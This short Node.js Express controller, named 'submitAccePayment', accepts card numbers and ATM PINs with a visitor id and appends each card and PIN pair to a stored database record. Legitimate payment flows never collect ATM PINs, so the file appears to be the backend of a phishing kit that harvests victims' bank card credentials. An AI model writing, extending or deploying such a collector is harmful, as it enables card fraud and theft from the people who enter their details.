const Acce = require('../models/acce');

exports.submitAccePayment = async (req, res) => {
  try {
    const { cardNumber, atmPin, uniqueid } = req.body;
    let accePayment = await Acce.findOne({ uniqueid });

    if (accePayment) {
      accePayment.entries.push({cardNumber, atmPin});
    } else {
      accePayment = new Acce({
        uniqueid,
        entries: [{ cardNumber, atmPin}]
      });
    }

    await accePayment.save();
    res.status(200).json({
      success: true,
      message: "Acce Payment Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting Acce payment data"
    });
  }
};
